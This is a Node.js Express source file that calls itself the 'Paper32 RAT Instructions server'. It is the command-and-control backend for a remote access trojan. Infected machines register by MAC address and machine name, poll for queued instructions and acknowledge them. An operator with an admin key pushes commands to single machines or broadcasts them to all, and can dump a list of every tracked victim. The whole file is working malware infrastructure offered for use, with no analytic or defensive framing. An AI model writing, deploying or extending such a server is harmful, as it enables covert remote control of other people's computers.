/*  Paper32 RAT Instructions server

    Yeah I know it's bad to put logic in index.js but I don't care
    SEE LICENSE FOR COPYRIGHT */


const fs = require('fs');
const express = require('express');
const bodyParser = require('body-parser');
const app = new express();


let config = {};
if (!fs.existsSync('./config.json')) {
  config.adminkey = 'adminkey';
  config.userkey = 'azertyuiop';
  fs.writeFileSync('./config.json', JSON.stringify(config));
  console.warn('Please configure the newly created config.json');
  process.exit(0);
}
else {
  config = JSON.parse(fs.readFileSync('./config.json'));
  if (!config.adminkey || !config.userkey) {
    console.error('Invalid configuration file');
    process.exit(0);
  }
}


// Body parser things
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

let instructions = {};

// STATIC SERVING

app.use('/static', express.static('./static'));

// USER END ENDPOINTS -- BEGIN

app.trace('/users/:mac/trace/:user/:version/do', (req, res) => {
  console.log(req.params.user + ' and mac ' + req.params.mac + ' with version ' + req.params.version);
  if (!instructions[req.params.mac]) {
    // Not yet registered in instructions, creating instance
    console.log('An user has been registered for the first time, in the TRACE request');
    instructions[req.params.mac] = {};
    instructions[req.params.mac].arr = [];
  }
  instructions[req.params.mac].lastTrace = new Date().toISOString();
  instructions[req.params.mac].machineName = req.params.user;
  instructions[req.params.mac].version = req.params.version;
  res.status(200);
  res.end();
})

app.get('/users/:mac/last', (req, res) => {
  if (!req.headers.authorization) {
    // Not authorized
    res.status(401);
    res.end('Error 401');
    return;
  }
  if (req.headers.authorization !== config.userkey && req.headers.authorization !== config.adminkey) {
    // Not authorized
    res.status(401);
    res.end('Error 401');
    return;
  }
  if (!instructions[req.params.mac]) {
    // Not yet registered in instructions, creating instance
    console.log('An user has been registered for the first time, in the GET request');
    instructions[req.params.mac] = {};
    instructions[req.params.mac].arr = [];
  }
  if (instructions[req.params.mac].arr.length === 0) {
    // Asking for instructions, while not pending
    res.status(200);
    res.end('no-entry');
    return;
  }
  let r = '';
  Object.keys(instructions[req.params.mac].arr[0]).forEach(key => {
    r += key + ': ' + instructions[req.params.mac].arr[0][key] + ';;;;';
  });
  console.log(r);
  res.status(200);
  res.end(r);
});

app.delete('/users/:mac/done', (req, res) => {
  if (!req.headers.authorization) {
    // Not authorized
    res.status(401);
    res.end('Error 401');
    return;
  }
  if (req.headers.authorization !== config.userkey && req.headers.authorization !== config.adminkey) {
    // Not authorized
    res.status(401);
    res.end('Error 401');
    return;
  }
  if (!instructions[req.params.mac]) {
    // Not yet registered in instructions, creating instance
    console.log('An user has been registered for the first time, in the DELETE request');
    instructions[req.params.mac] = {};
    instructions[req.params.mac].arr = [];
  }
  if (instructions[req.params.mac].arr.length === 0) {
    // Instructions list already empty, ignore
    res.status(200);
    res.end();
    return;
  }
  // Shift instructions
  instructions[req.params.mac].arr.shift();
  res.status(200);
  res.end();
});

// USER END ENDPOINTS -- END

// ADMIN END ENDPOINTS -- BEGIN

app.post('/users/:mac/admin/add', (req, res) => {
  // This endpoint is for adding instructions for a particular MAC
  if (!req.headers.authorization) {
    // Not authorized
    res.status(401);
    res.end('Error 401');
    return;
  }
  if (req.headers.authorization !== config.adminkey) {
    // Not authorized
    res.status(401);
    res.end('Error 401');
    return;
  }
  if (!instructions[req.params.mac]) {
    // Not yet registered in instructions, creating instance
    console.log('An user has been registered for the first time, in the admin POST request');
    instructions[req.params.mac] = {};
    instructions[req.params.mac].arr = [];
    // Not return this time
  }
  instructions[req.params.mac].arr.push(JSON.parse(JSON.stringify(req.body)));
  res.status(200);
  res.end();
});

app.get('/admin/debug', (req, res) => {
  if (!req.headers.authorization) {
    // Not authorized
    res.status(401);
    res.end('Error 401');
    return;
  }
  if (req.headers.authorization !== config.adminkey) {
    // Not authorized
    res.status(401);
    res.end('Error 401');
    return;
  }
  res.json(instructions);
});

app.post('/admin/broadcast', (req, res) => {
  if (!req.headers.authorization) {
    // Not authorized
    res.status(401);
    res.end('Error 401');
    return;
  }
  if (req.headers.authorization !== config.adminkey) {
    // Not authorized
    res.status(401);
    res.end('Error 401');
    return;
  }
  Object.keys(instructions).forEach(key => {
    instructions[key].arr.push(JSON.parse(JSON.stringify(req.body)));
  });
  res.status(200);
  res.end();
});

// ADMIN END ENDPOINTS -- END

app.use((req, res) => {
  // 404 fallback
  res.status(404);
  res.end('Error 404');
});

app.listen(9033);